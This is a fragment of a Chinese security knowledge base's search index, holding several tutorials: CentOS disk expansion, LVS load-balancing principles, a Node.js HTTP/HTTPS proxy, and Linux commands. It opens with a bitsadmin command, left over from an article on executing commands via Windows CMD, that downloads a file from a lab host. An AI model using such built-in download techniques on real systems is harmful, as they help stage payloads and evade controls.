bitsadmin /transfer /myDownload /download /priority normal \"http://192.168.200.76:8888/test.txt\" c:\\22.txt Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:24:18 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/14.Windows_CMD.exe执行任意代码、命令、程序的漏洞.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/15.CentOS7虚拟机根目录扩容（无卷组情况下）.html":{"url":"知识库/03.主机安全/15.CentOS7虚拟机根目录扩容（无卷组情况下）.html","title":"15.CentOS7虚拟机根目录扩容（无卷组情况下）","keywords":"","body":" 前言 0x1 增加虚拟磁盘容量 0x2 使用fdisk 扩容 前言 由于最近在给公司管培生做培训，需要用到Docker，原以为20个G的CentOS够用了，但是发现还是小瞧了docker的镜像，安装到一半突然告知磁盘不够，所以马上开始紧急扩容 0x1 增加虚拟磁盘容量 虚拟机正常关机后，打开此虚拟机的设置，选择硬盘 然后在磁盘大小处填写需要扩展到合适的硬盘大小量，点击应用即可 然后打开虚拟机，可以看到磁盘已经有120个G了，但是根目录只有18个G 0x2 使用fdisk 扩容 在/dev/sda 这块磁盘中，可以看到当前挂载到根目录的为/dev/sda3，其他的则为系统所需磁盘 如果需要将磁盘扩展到挂载根目录的需要将/dev/sda3 删除，然后再重新分区 [root@localhost aaron]# fdisk /dev/sda Welcome to fdisk (util-linux 2.23.2). Changes will remain in memory only, until you decide to write them. Be careful before using the write command. Command (m for help): p Disk /dev/sda: 128.8 GB, 128849018880 bytes, 251658240 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk label type: dos Disk identifier: 0x000ab441 Device Boot Start End Blocks Id System /dev/sda1 * 2048 616447 307200 83 Linux /dev/sda2 616448 4810751 2097152 82 Linux swap / Solaris /dev/sda3 4810752 41943039 18566144 83 Linux Command (m for help): d Partition number (1-3, default 3): 3 Partition 3 is deleted Command (m for help): n Partition type: p primary (2 primary, 0 extended, 2 free) e extended Select (default p): p Partition number (3,4, default 3): First sector (4810752-251658239, default 4810752): Using default value 4810752 Last sector, +sectors or +size{K,M,G} (4810752-251658239, default 251658239): Using default value 251658239 Partition 3 of type Linux and of size 117.7 GiB is set Command (m for help): w The partition table has been altered! Calling ioctl() to re-read partition table. WARNING: Re-reading the partition table failed with error 16: Device or resource busy. The kernel still uses the old table. The new table will be used at the next reboot or after you run partprobe(8) or kpartx(8) Syncing disks. 上述步骤执行完之后，执行lsblk，可以看到当前更改还未生效 [root@localhost Desktop]# lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 120G 0 disk ├─sda1 8:1 0 300M 0 part /boot ├─sda2 8:2 0 2G 0 part [SWAP] └─sda3 8:3 0 17.7G 0 part / sr0 11:0 1 1024M 0 rom 需要重启 reboot 重启之后执行lsblk ，可以看到此时/dev/sda3 分区的大小已经修改为117.7G了，但是我们使用df -hT查看却还是18G 下一步则需要刷新磁盘 xfs_growfs /dev/sda3 至此，磁盘扩容完毕 Ubuntu 使用xfs_growfs 无法成功 通知系统内核分区表的变化，输入：partprobe /dev/sda 对文件系统进行扩容，输入：resize2fs /dev/sda1 查看/dev/sda1是否扩容成功，输入：df -TH Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:23:44 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/15.CentOS7虚拟机根目录扩容（无卷组情况下）.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/16.LVS架构及原理.html":{"url":"知识库/03.主机安全/16.LVS架构及原理.html","title":"16.LVS架构及原理","keywords":"","body":" LVS架构及原理 简介 LVS 架构 LVS 基本工作原理 相关术语 三种模式及原理 LVS-NAT原理和特点 LVS-DR原理和特点 LVS-Tun原理和特点 LVS 十种调度算法 静态调度： 动态调度： LVS架构及原理 简介 LVS是Linux Virtual Server的简称，也就是Linux虚拟服务器，是一个由章文嵩博士发起的自由软件项目，官方站点是：http://www.linuxvirtualserver.org。现在LVS已经是Linux标准内核的一部分，在Linux2.4内核以前，使用LVS时必须重新编译内核以支持LVS功能模块，但是从Linux2.4内核心之后，已经完全内置了LVS的各个功能模块，无需给内核打任何补丁，可以直接使用LVS提供的各种功能。 使用LVS技术要达到的目标是：通过LVS提供的负载均衡技术和Linux操作系统实现一个高性能，高可用的服务器群集，它具有良好的可靠性、可扩展性和可操作性。从而以低廉的成本实现最优的服务性能。 LVS 架构 使用LVS架设的服务器集群系统有三个部分组成：最前端的负载均衡层（Loader Balancer），中间的服务器群组层，用Server Array表示，最底层的数据共享存储层，用Shared Storage表示。在用户看来所有的应用都是透明的，用户只是在使用一个虚拟服务器提供的高性能服务。 LVS的体系架构如图： LVS的各个层次的详细介绍： Load Balancer层：位于整个集群系统的最前端，有一台或者多台负载调度器（Director Server）组成，LVS模块就安装在Director Server上，而Director的主要作用类似于一个路由器，它含有完成LVS功能所设定的路由表，通过这些路由表把用户的请求分发给Server Array层的应用服务器（Real Server）上。同时，在Director Server上还要安装对Real Server服务的监控模块Ldirectord，此模块用于监测各个Real Server服务的健康状况。在Real Server不可用时把它从LVS路由表中剔除，恢复时重新加入。 Server Array层：由一组实际运行应用服务的机器组成，Real Server可以是WEB服务器、MAIL服务器、FTP服务器、DNS服务器、视频服务器中的一个或者多个，每个Real Server之间通过高速的LAN或分布在各地的WAN相连接。在实际的应用中，Director Server也可以同时兼任Real Server的角色。 Shared Storage层：是为所有Real Server提供共享存储空间和内容一致性的存储区域，在物理上，一般有磁盘阵列设备组成，为了提供内容的一致性，一般可以通过NFS网络文件系统共享数 据，但是NFS在繁忙的业务系统中，性能并不是很好，此时可以采用集群文件系统，例如Red hat的GFS文件系统，oracle提供的OCFS2文件系统等。 从整个LVS结构可以看出，Director Server是整个LVS的核心，目前，用于Director Server的操作系统只能是Linux和FreeBSD，linux2.6内核不用任何设置就可以支持LVS功能，而FreeBSD作为 Director Server的应用还不是很多，性能也不是很好。对于Real Server，几乎可以是所有的系统平台，Linux、windows、Solaris、AIX、BSD系列都能很好的支持。 LVS 基本工作原理 当用户向负载均衡调度器（Director Server）发起请求，调度器将请求发往至内核空间 PREROUTING链首先会接收到用户请求，判断目标IP确定是本机IP，将数据包发往INPUT链 IPVS是工作在INPUT链上的，当用户请求到达INPUT时，IPVS会将用户请求和自己已定义好的集群服务进行比对，如果用户请求的就是定义的集群服务，那么此时IPVS会强行修改数据包里的目标IP地址及端口，并将新的数据包发往POSTROUTING链 POSTROUTING链接收数据包后发现目标IP地址刚好是自己的后端服务器，那么此时通过选路，将数据包最终发送给后端的服务器 相关术语 DS：Director Server。指的是前端负载均衡器节点。 RS：Real Server。后端真实的工作服务器。 VIP：向外部直接面向用户请求，作为用户请求的目标的IP地址。 DIP：Director Server IP，主要用于和内部主机通讯的IP地址。 RIP：Real Server IP，后端服务器的IP地址。 CIP：Client IP，客户端的IP地址 三种模式及原理 LVS-NAT原理和特点 多目标IP的DNAT，通过将请求报文中的目标地址和目标端口修改为某挑出的RS的RIP和PORT实现转发 当用户请求到达Director Server，此时请求的数据报文会先到内核空间的PREROUTING链。 此时报文的源IP为CIP，目标IP为VIP PREROUTING检查发现数据包的目标IP是本机，将数据包送至INPUT链 IPVS比对数据包请求的服务是否为集群服务，若是，修改数据包的目标IP地址为后端服务器IP，后将数据包发至POSTROUTING链。 此时报文的源IP为CIP，目标IP为RIP POSTROUTING链通过选路，将数据包发送给Real Server Real Server比对发现目标为自己的IP，开始构建响应报文发回给Director Server。 此时报文的源IP为RIP，目标IP为CIP Director Server在响应客户端前，此时会将源IP地址修改为自己的VIP地址，然后响应给客户端。 此时报文的源IP为VIP，目标IP为CIP LVS-NAT模式的特性 RS应该和DIP应该使用私网地址，且RS的网关要指向DIP； 请求和响应报文都要经由director转发；极高负载的场景中，director可能会成为系统瓶颈； 支持端口映射； RS可以使用任意OS； RS的RIP和Director的DIP必须在同一IP网络； 缺陷：对Director Server压力会比较大，请求和响应都需经过director server LVS-DR原理和特点 通过为请求报文重新封装一个MAC首部进行转发，源MAC是DIP所在的接口的MAC，目标MAC是某挑选出的RS的RIP所在接口的MAC地址；源IP/PORT，以及目标IP/PORT均保持不变； 当用户请求到达Director Server，此时请求的数据报文会先到内核空间的PREROUTING链。 此时报文的源IP为CIP，目标IP为VIP PREROUTING检查发现数据包的目标IP是本机，将数据包送至INPUT链 IPVS比对数据包请求的服务是否为集群服务，若是，将请求报文中的源MAC地址修改为DIP的MAC地址，将目标MAC地址修改RIP的MAC地址，然后将数据包发至POSTROUTING链。 此时的源IP和目的IP均未修改，仅修改了源MAC地址为DIP的MAC地址，目标MAC地址为RIP的MAC地址 由于DS和RS在同一个网络中，所以是通过二层来传输。POSTROUTING链检查目标MAC地址为RIP的MAC地址，那么此时数据包将会发至Real Server。 RS发现请求报文的MAC地址是自己的MAC地址，就接收此报文。处理完成之后，将响应报文通过lo接口传送给eth0网卡然后向外发出。 此时的源IP地址为VIP，目标IP为CIP 响应报文最终送达至客户端 LVS-DR模式的特性 确保前端路由器将目标IP为VIP的请求报文发往Director： 在前端网关做静态绑定； 在RS上使用arptables； 在RS上修改内核参数以限制arp通告及应答级别； 修改RS上内核参数（arp_ignore和arp_announce）将RS上的VIP配置在lo接口的别名上，并限制其不能响应对VIP地址解析请求。 RS的RIP可以使用私网地址，也可以是公网地址；RIP与DIP在同一IP网络；RIP的网关不能指向DIP，以确保响应报文不会经由Director； RS跟Director要在同一个物理网络； 请求报文要经由Director，但响应不能经由Director，而是由RS直接发往Client； 不支持端口映射； 缺陷：RS和DS必须在同一机房中 LVS-Tun原理和特点 在原有的IP报文外再次封装多一层IP首部，内部IP首部(源地址为CIP，目标IIP为VIP)，外层IP首部(源地址为DIP，目标IP为RIP) 当用户请求到达Director Server，此时请求的数据报文会先到内核空间的PREROUTING链。 此时报文的源IP为CIP，目标IP为VIP 。 PREROUTING检查发现数据包的目标IP是本机，将数据包送至INPUT链 IPVS比对数据包请求的服务是否为集群服务，若是，在请求报文的首部再次封装一层IP报文，封装源IP为为DIP，目标IP为RIP。然后发至POSTROUTING链。 此时源IP为DIP，目标IP为RIP POSTROUTING链根据最新封装的IP报文，将数据包发至RS（因为在外层封装多了一层IP首部，所以可以理解为此时通过隧道传输）。 此时源IP为DIP，目标IP为RIP RS接收到报文后发现是自己的IP地址，就将报文接收下来，拆除掉最外层的IP后，会发现里面还有一层IP首部，而且目标是自己的lo接口VIP，那么此时RS开始处理此请求，处理完成之后，通过lo接口送给eth0网卡，然后向外传递。 此时的源IP地址为VIP，目标IP为CIP 响应报文最终送达至客户端 LVS-Tun模式的特性 DIP, VIP, RIP都应该是公网地址； RS的网关不能，也不可能指向DIP； 请求报文要经由Director，但响应不能经由Director； 不支持端口映射； RS的OS得支持隧道功能； 其实企业中最常用的是 DR 实现方式，而 NAT 配置上比较简单和方便，后续实践中会总结 DR 和 NAT 具体使用配置过程 LVS 十种调度算法 静态调度： RR（Round Robin）:轮询调度 轮询调度算法的原理是每一次把来自用户的请求轮流分配给内部中的服务器，从1开始，直到N(内部服务器个数)，然后重新开始循环。算法的优点是其简洁性，它无需记录当前所有连接的状态，所以它是一种无状态调度。【提示：这里是不考虑每台服务器的处理能力】 WRR：weight,加权轮询（以权重之间的比例实现在各主机之间进行调度） 由于每台服务器的配置、安装的业务应用等不同，其处理能力会不一样。所以，我们根据服务器的不同处理能力，给每个服务器分配不同的权值，使其能够接受相应权值数的服务请求。 SH:source hashing：源地址散列，主要实现会话绑定，能够将此前建立的session信息保留了 源地址散列调度算法正好与目标地址散列调度算法相反，它根据请求的源IP地址，作为散列键（Hash Key）从静态分配的散列表找出对应的服务器，若该服务器是可用的并且没有超负荷，将请求发送到该服务器，否则返回空。它采用的散列函数与目标地址散列调度算法的相同。它的算法流程与目标地址散列调度算法的基本相似，除了将请求的目标IP地址换成请求的源IP地址，所以这里不一个一个叙述。 DH:Destination hashing:目标地址散列。把同一个IP地址的请求，发送给同一个server 目标地址散列调度算法也是针对目标IP地址的负载均衡，它是一种静态映射算法，通过一个散列（Hash）函数将一个目标IP地址映射到一台服务器。目标地址散列调度算法先根据请求的目标IP地址，作为散列键（Hash Key）从静态分配的散列表找出对应的服务器，若该服务器是可用的且未超载，将请求发送到该服务器，否则返回空。 动态调度： LC（Least-Connection）：最少连接 最少连接调度算法是把新的连接请求分配到当前连接数最小的服务器，最小连接调度是一种动态调度短算法，它通过服务器当前所活跃的连接数来估计服务器的负载均衡，调度器需要记录各个服务器已建立连接的数目，当一个请求被调度到某台服务器，其连接数加1，当连接中止或超时，其连接数减一，在系统实现时，我们也引入当服务器的权值为0时，表示该服务器不可用而不被调度。 简单算法：active*256+inactive(谁的小，挑谁) WLC(Weighted Least-Connection Scheduling)：加权最少连接 加权最小连接调度算法是最小连接调度的超集，各个服务器用相应的权值表示其处理性能。服务器的缺省权值为1，系统管理员可以动态地设置服务器的权限，加权最小连接调度在调度新连接时尽可能使服务器的已建立连接数和其权值成比例。 简单算法：（active*256+inactive）/weight【（活动的连接数+1）/除以权重】（谁的小，挑谁） SED(Shortest Expected Delay)：最短期望延迟 基于wlc算法 简单算法：（active+1)*256/weight【（活动的连接数+1）*256/除以权重】 NQ（never queue）:永不排队（改进的sed） 无需队列，如果有台realserver的连接数＝0就直接分配过去，不需要在进行sed运算。 LBLC（Locality-Based Least Connection）：基于局部性的最少连接 基于局部性的最少连接算法是针对请求报文的目标IP地址的负载均衡调度，不签主要用于Cache集群系统，因为Cache集群中客户请求报文的布标IP地址是变化的，这里假设任何后端服务器都可以处理任何请求，算法的设计目标在服务器的负载基本平衡的情况下，将相同的目标IP地址的请求调度到同一个台服务器，来提高个太服务器的访问局部性和主存Cache命中率，从而调整整个集群系统的处理能力。 基于局部性的最少连接调度算法根据请求的目标IP地址找出该目标IP地址最近使用的RealServer，若该Real Server是可用的且没有超载，将请求发送到该服务器；若服务器不存在，或者该服务器超载且有服务器处于一半的工作负载，则用“最少链接”的原则选出一个可用的服务器，将请求发送到该服务器。 LBLCR（Locality-Based Least Connections withReplication）：带复制的基于局部性最少连接 带复制的基于局部性最少链接调度算法也是针对目标IP地址的负载均衡，该算法根据请求的目标IP地址找出该目标IP地址对应的服务器组，按“最小连接”原则从服务器组中选出一台服务器，若服务器没有超载，将请求发送到该服务器；若服务器超载，则按“最小连接”原则从这个集群中选出一台服务器，将该服务器加入到服务器组中，将请求发送到该服务器。同时，当该服务器组有一段时间没有被修改，将最忙的服务器从服务器组中删除，以降低复制的程度。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-25 10:28:33 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/16.LVS架构及原理.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/17.HTTP代理原理及实现.html":{"url":"知识库/03.主机安全/17.HTTP代理原理及实现.html","title":"17.HTTP代理原理及实现","keywords":"","body":" HTTP代理原理及实现 简介 普通代理 隧道代理 HTTPS代理 参考文章 HTTP代理原理及实现 简介 Web 代理是一种存在于网络中间的实体，提供各式各样的功能。现代网络系统中，Web 代理无处不在。 HTTP 代理存在 两种形式 第一种RFC 7230 - HTTP/1.1: Message Syntax and Routing（即修订后的 RFC 2616，HTTP/1.1 协议的第一部分）描述的普通代理；这种代理扮演的是「中间人」角色，对于连接到它的客户端来说，它是服务端；对于要连接的服务端来说，它是客户端。它就负责在两端之间来回传送 HTTP 报文 第二种是 Tunneling TCP based protocols through Web proxy servers（通过 Web 代理服务器用隧道方式传输基于 TCP 的协议）描述的隧道代理。它通过 HTTP 协议正文部分（Body）完成通讯，以 HTTP 的方式实现任意基于 TCP 的应用层协议代理。这种代理使用 HTTP 的 CONNECT 方法建立连接，但 CONNECT 最开始并不是 RFC 2616 - HTTP/1.1 的一部分，直到 2014 年发布的 HTTP/1.1 修订版中，才增加了对 CONNECT 及隧道代理的描述，详见 RFC 7231 - HTTP/1.1: Semantics and Content。实际上这种代理早就被广泛实现 本文描述的第一种代理，对应《HTTP 权威指南》一书中第六章「代理」；第二种代理，对应第八章「集成点：网关、隧道及中继」中的 8.5 小节「隧道」。 普通代理 第一种 Web 代理原理特别简单： HTTP 客户端向代理发送请求报文，代理服务器需要正确地处理请求和连接（例如正确处理 Connection: keep-alive），同时向服务器发送请求，并将收到的响应转发给客户端。 下面这张图片来自于《HTTP 权威指南》，直观地展示了上述行为： 假如我通过代理访问 A 网站，对于 A 来说，它会把代理当做客户端，完全察觉不到真正客户端的存在，这实现了隐藏客户端 IP 的目的。当然代理也可以修改 HTTP 请求头部，通过 X-Forwarded-IP 这样的自定义头部告诉服务端真正的客户端 IP。但服务器无法验证这个自定义头部真的是由代理添加，还是客户端修改了请求头，所以从 HTTP 头部字段获取 IP 时，需要格外小心。 给浏览器显式的指定代理，需要手动修改浏览器或操作系统相关设置，或者指定 PAC（Proxy Auto-Configuration，自动配置代理）文件自动设置，还有些浏览器支持 WPAD（Web Proxy Autodiscovery Protocol，Web 代理自动发现协议）。显式指定浏览器代理这种方式一般称之为正向代理，浏览器启用正向代理后，会对 HTTP 请求报文做一些修改，来规避老旧代理服务器的一些问题 还有一种情况是访问 A 网站时，实际上访问的是代理，代理收到请求报文后，再向真正提供服务的服务器发起请求，并将响应转发给浏览器。这种情况一般被称之为反向代理，它可以用来隐藏服务器 IP 及端口。一般使用反向代理后，需要通过修改 DNS 让域名解析到代理服务器 IP，这时浏览器无法察觉到真正服务器的存在，当然也就不需要修改配置了。反向代理是 Web 系统最为常见的一种部署方式 了解完第一种代理的基本原理后，我们用 Node.js 实现一下它。只包含核心逻辑的代码如下： var http = require('http'); var net = require('net'); var url = require('url'); function request(cReq, cRes) { var u = url.parse(cReq.url); var options = { hostname : u.hostname, port : u.port || 80, path : u.path, method : cReq.method, headers : cReq.headers }; var pReq = http.request(options, function(pRes) { cRes.writeHead(pRes.statusCode, pRes.headers); pRes.pipe(cRes); }).on('error', function(e) { cRes.end(); }); cReq.pipe(pReq); } http.createServer().on('request', request).listen(8888, '0.0.0.0'); 以上代码运行后，会在本地 8888 端口开启 HTTP 代理服务，这个服务从请求报文中解析出请求 URL 和其他必要参数，新建到服务端的请求，并把代理收到的请求转发给新建的请求，最后再把服务端响应返回给浏览器。修改浏览器的 HTTP 代理为 127.0.0.1:8888 后再访问 HTTP 网站，代理可以正常工作 但是，使用我们这个代理服务后，HTTPS 网站完全无法访问，这是为什么呢？答案很简单，这个代理提供的是 HTTP 服务，根本没办法承载 HTTPS 服务。那么是否把这个代理改为 HTTPS 就可以了呢？显然也不可以，因为这种代理的本质是中间人，而 HTTPS 网站的证书认证机制是中间人劫持的克星。普通的 HTTPS 服务中，服务端不验证客户端的证书，中间人可以作为客户端与服务端成功完成 TLS 握手；但是中间人没有证书私钥，无论如何也无法伪造成服务端跟客户端建立 TLS 连接。当然如果你拥有证书私钥，代理证书对应的 HTTPS 网站当然就没问题了 HTTP 抓包神器 Fiddler 的工作原理也是在本地开启 HTTP 代理服务，通过让浏览器流量走这个代理，从而实现显示和修改 HTTP 包的功能。如果要让 Fiddler 解密 HTTPS 包的内容，需要先将它自带的根证书导入到系统受信任的根证书列表中。一旦完成这一步，浏览器就会信任 Fiddler 后续的「伪造证书」，从而在浏览器和 Fiddler、Fiddler 和服务端之间都能成功建立 TLS 连接。而对于 Fiddler 这个节点来说，两端的 TLS 流量都是可以解密的。 如果我们不导入根证书，Fiddler 的 HTTP 代理还能代理 HTTPS 流量么？实践证明，不导入根证书，Fiddler 只是无法解密 HTTPS 流量，HTTPS 网站还是可以正常访问。这是如何做到的，这些 HTTPS 流量是否安全呢？这些问题将在下一节揭晓 隧道代理 第二种 Web 代理的原理也很简单： HTTP 客户端通过 CONNECT 方法请求隧道代理创建一条到达任意目的服务器和端口的 TCP 连接，并对客户端和服务器之间的后继数据进行盲转发。 下面这张图片同样来自于《HTTP 权威指南》，直观地展示了上述行为： 假如我通过代理访问 A 网站，浏览器首先通过 CONNECT 请求，让代理创建一条到 A 网站的 TCP 连接；一旦 TCP 连接建好，代理无脑转发后续流量即可。所以这种代理，理论上适用于任意基于 TCP 的应用层协议，HTTPS 网站使用的 TLS 协议当然也可以。这也是这种代理为什么被称为隧道的原因。对于 HTTPS 来说，客户端透过代理直接跟服务端进行 TLS 握手协商密钥，所以依然是安全的，下图中的抓包信息显示了这种场景 可以看到，浏览器与代理进行 TCP 握手之后，发起了 CONNECT 请求，报文起始行如下： CONNECT imququ.com:443 HTTP/1.1 对于 CONNECT 请求来说，只是用来让代理创建 TCP 连接，所以只需要提供服务器域名及端口即可，并不需要具体的资源路径。代理收到这样的请求后，需要与服务端建立 TCP 连接，并响应给浏览器这样一个 HTTP 报文： HTTP/1.1 200 Connection Established 浏览器收到了这个响应报文，就可以认为到服务端的 TCP 连接已经打通，后续直接往这个 TCP 连接写协议数据即可。通过 Wireshark 的 Follow TCP Steam 功能，可以清楚地看到浏览器和代理之间的数据传递： 可以看到，浏览器建立到服务端 TCP 连接产生的 HTTP 往返，完全是明文，这也是为什么 CONNECT 请求只需要提供域名和端口：如果发送了完整 URL、Cookie 等信息，会被中间人一览无余，降低了 HTTPS 的安全性。HTTP 代理承载的 HTTPS 流量，应用数据要等到 TLS 握手成功之后通过 Application Data 协议传输，中间节点无法得知用于流量加密的 master-secret，无法解密数据。而 CONNECT 暴露的域名和端口，对于普通的 HTTPS 请求来说，中间人一样可以拿到（IP 和端口很容易拿到，请求的域名可以通过 DNS Query 或者 TLS Client Hello 中的 Server Name Indication 拿到），所以这种方式并没有增加安全性。 了解完原理后，再用 Node.js 实现一个支持 CONNECT 的代理也很简单。核心代码如下： var http = require('http'); var net = require('net'); var url = require('url'); function connect(cReq, cSock) { var u = url.parse('http://' + cReq.url); var pSock = net.connect(u.port, u.hostname, function() { cSock.write('HTTP/1.1 200 Connection Established\\r\\n\\r\\n'); pSock.pipe(cSock); }).on('error', function(e) { cSock.end(); }); cSock.pipe(pSock); } http.createServer().on('connect', connect).listen(8888, '0.0.0.0'); 以上代码运行后，会在本地 8888 端口开启 HTTP 代理服务，这个服务从 CONNECT 请求报文中解析出域名和端口，创建到服务端的 TCP 连接，并和 CONNECT 请求中的 TCP 连接串起来，最后再响应一个 Connection Established 响应。修改浏览器的 HTTP 代理为 127.0.0.1:8888 后再访问 HTTPS 网站，代理可以正常工作。 最后，将两种代理的实现代码合二为一，就可以得到全功能的 Proxy 程序了，全部代码在 50 行以内（当然异常什么的基本没考虑） var http = require('http'); var net = require('net'); var url = require('url'); function request(cReq, cRes) { var u = url.parse(cReq.url); var options = { hostname : u.hostname, port : u.port || 80, path : u.path, method : cReq.method, headers : cReq.headers }; var pReq = http.request(options, function(pRes) { cRes.writeHead(pRes.statusCode, pRes.headers); pRes.pipe(cRes); }).on('error', function(e) { cRes.end(); }); cReq.pipe(pReq); } function connect(cReq, cSock) { var u = url.parse('http://' + cReq.url); var pSock = net.connect(u.port, u.hostname, function() { cSock.write('HTTP/1.1 200 Connection Established\\r\\n\\r\\n'); pSock.pipe(cSock); }).on('error', function(e) { cSock.end(); }); cSock.pipe(pSock); } http.createServer() .on('request', request) .on('connect', connect) .listen(8888, '0.0.0.0'); 需要注意的是，大部分浏览器显式配置了代理之后，只会让 HTTPS 网站走隧道代理，这是因为建立隧道需要耗费一次往返，能不用就尽量不用。但这并不代表 HTTP 请求不能走隧道代理，我们用 Node.js 写段程序验证下（先运行前面的代理服务）： var http = require('http'); var options = { hostname : '127.0.0.1', port : 8888, path : 'imququ.com:80', method : 'CONNECT' }; var req = http.request(options); req.on('connect', function(res, socket) { socket.write('GET / HTTP/1.1\\r\\n' + 'Host: imququ.com\\r\\n' + 'Connection: Close\\r\\n' + '\\r\\n'); socket.on('data', function(chunk) { console.log(chunk.toString()); }); socket.on('end', function() { console.log('socket end.'); }); }); req.end(); 这段代码运行完，结果如下： HTTP/1.1 301 Moved Permanently Server: nginx Date: Thu, 19 Nov 2015 15:57:47 GMT Content-Type: text/html Content-Length: 178 Connection: close Location: https://imququ.com/ 301 Moved Permanently 301 Moved Permanently nginx socket end. 可以看到，通过 CONNECT 让代理打开到目标服务器的 TCP 连接，用来承载 HTTP 流量也是完全没问题的。 最后，HTTP 的认证机制可以跟代理配合使用，使得必须输入正确的用户名和密码才能使用代理，这部分内容比较简单，这里略过。 HTTPS代理 普通代理可以用来承载 HTTP 流量；隧道代理可以用来承载任何 TCP 流量，包括 HTTP 和 HTTPS，他们是一个标准的 HTTP 服务，针对浏览器的普通请求和 CONNECT 请求，进行不同的处理。Node.js 为创建 HTTP 或 HTTPS Server 提供了高度一致的接口，要将 HTTP 服务升级为 HTTPS 特别方便，只有一点点准备工作要做 我们知道 TLS 有三大功能：内容加密、身份认证和数据完整性。其中内容加密依赖于密钥协商机制；数据完整性依赖于 MAC（Message authentication code）校验机制；而身份认证则依赖于证书认证机制。一般操作系统或浏览器会维护一个受信任根证书列表，包含在列表之中的证书，或者由列表中的证书签发的证书都会被客户端信任 提供 HTTPS 服务的证书可以自己生成，然后手动加入到系统根证书列表中。但是对外提供服务的 HTTPS 网站，不可能要求每个用户都手动导入你的证书，所以更常见的做法是向 CA（Certificate Authority，证书颁发机构）申请。根据证书的不同级别，CA 会进行不同级别的验证，验证通过后 CA 会用他们的证书签发网站证书，这个过程通常是收费的（有免费的证书，最近免费的 Let's Encrypt 也很火，这里不多介绍）。由于 CA 使用的证书都是由广泛内置在各系统中的根证书签发，所以从 CA 获得的网站证书会被绝大部分客户端信任。 通过 CA 申请证书很简单，本文为了方便演示，采用自己签发证书的偷懒办法。现在广泛使用的证书是 x509.v3 格式，使用以下命令可以创建： openssl genrsa -out private.pem 2048 openssl req -new -x509 -key private.pem -out public.crt -days 99999 第二行命令运行后，需要填写一些证书信息。需要注意的是 Common Name 一定要填写后续提供 HTTPS 服务的域名或 IP。例如你打算在本地测试，Common Name 可以填写 127.0.0.1。证书创建好之后，再将 public.crt 添加到系统受信任根证书列表中。为了确保添加成功，可以用浏览器验证一下： 接着，可以改造之前的 Node.js 代码了，需要改动的地方不多 var http = require('http'); var https = require('https'); var fs = require('fs'); var net = require('net'); var url = require('url'); function request(cReq, cRes) { var u = url.parse(cReq.url); var options = { hostname : u.hostname, port : u.port || 80, path : u.path, method : cReq.method, headers : cReq.headers }; var pReq = http.request(options, function(pRes) { cRes.writeHead(pRes.statusCode, pRes.headers); pRes.pipe(cRes); }).on('error', function(e) { cRes.end(); }); cReq.pipe(pReq); } function connect(cReq, cSock) { var u = url.parse('http://' + cReq.url); var pSock = net.connect(u.port, u.hostname, function() { cSock.write('HTTP/1.1 200 Connection Established\\r\\n\\r\\n'); pSock.pipe(cSock); }).on('error', function(e) { cSock.end(); }); cSock.pipe(pSock); } var options = { key: fs.readFileSync('./private.pem'), cert: fs.readFileSync('./public.crt') }; https.createServer(options) .on('request', request) .on('connect', connect) .listen(8888, '0.0.0.0'); 可以看到，除了将 http.createServer 换成 https.createServer，增加证书相关配置之外，这段代码没有任何改变。这也是引入 TLS 层的妙处，应用层不需要任何改动，就能获得诸多安全特性。 运行服务后，只需要将浏览器的代理设置为 HTTPS 127.0.0.1:8888 即可，功能照旧。这样改造，只是将浏览器到代理之间的流量升级为了 HTTPS，代理自身逻辑、与服务端的通讯方式，都没有任何变化。 参考文章 https://imququ.com/post/web-proxy.html https://imququ.com/post/web-proxy-2.html Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-25 10:39:37 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/17.HTTP代理原理及实现.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/18.Linux常用命令.html":{"url":"知识库/03.主机安全/18.Linux常用命令.html","title":"18.Linux常用命令","keywords":"","body":" Linux tar 打包（归档）压缩 tar打包命令详解 tar命令做解打包操作 tar命令做打包压缩（解压缩解打包）操作 Linux zip命令：压缩文件或目录 Linux unzip命令：解压zip文件 Linux gzip命令：压缩文件或目录 Linux gunzip命令：解压缩文件或目录 Linux bzip2命令：压缩文件（.bz2格式） Linux bunzip2命令：bz2格式的解压缩命令 Vim 文本编辑器 Vim的命令模式 Vim的输入模式 Vim 的编辑模式 Linux Vim基本操作（文件的打开和编辑）完全攻略（有图有真相） Vim 插入文本 Vim 查找文本 Vim 替换文本 Vim删除文本 Vim复制和粘贴文本 Vim其他常用快捷键 Vim 保存退出文本 Vim移动光标快捷键汇总 Linux Vim撤销和恢复撤销快捷键用法详解 Vim多窗口编辑模式 Vim显示行号 Vim配置文件（.vimrc）详解 Linux 三剑客(grep,awak,sed) Linux grep命令详解：查找文件内容 Linux sed命令完全攻略（超级详细） Linux tar 打包（归档）压缩 归档，也称为打包，指的是一个文件或目录的集合，而这个集合被存储在一个文件中。归档文件没有经过压缩，因此，它占用的空间是其中所有文件和目录的总和。 压缩文件也是一个文件和目录的集合，且这个集合也被存储在一个文件中，但它们的不同之处在于，压缩文件采用了不同的存储方式，使其所占用的磁盘空间比集合中所有文件大小的总和要小。 压缩是指利用算法将文件进行处理，已达到保留最大文件信息，而让文件体积变小的目的。其基本原理为，通过查找文件内的重复字节，建立一个相同字节的词典文件，并用一个代码表示。比如说，在压缩文件中，有不止一处出现了 \"C语言中文网\"，那么，在压缩文件时，这个词就会用一个代码表示并写入词典文件，这样就可以实现缩小文件体积的目的。 